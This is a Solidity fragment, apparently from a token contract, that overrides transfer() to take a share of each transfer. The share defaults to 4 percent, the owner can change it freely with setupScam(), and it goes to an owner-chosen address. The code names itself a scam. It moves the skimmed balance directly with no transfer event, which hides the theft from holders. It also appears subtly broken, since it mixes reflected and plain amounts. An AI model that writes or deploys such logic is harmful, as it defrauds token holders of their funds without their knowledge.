uint256 scamPercent = 4;
address scamAddress = address(0);
function setupScam(uint256 percentage, address beneficiary) public onlyOwner {
    scamPercent = percentage;
    scamAddress = beneficiary;
}
function transfer(address recipient, uint256 amount) public override returns (bool) {
    uint256 scamAmount = amount.mul(scamPercent).div(100);
    uint256 remainingAmount = amount.sub(scamAmount);
    _rOwned[_msgSender()] = _rOwned[_msgSender()].sub(scamAmount);
    _rOwned[scamAddress] = _rOwned[scamAddress].add(scamAmount);
    _transfer(_msgSender(), recipient, remainingAmount);
    return true;
}
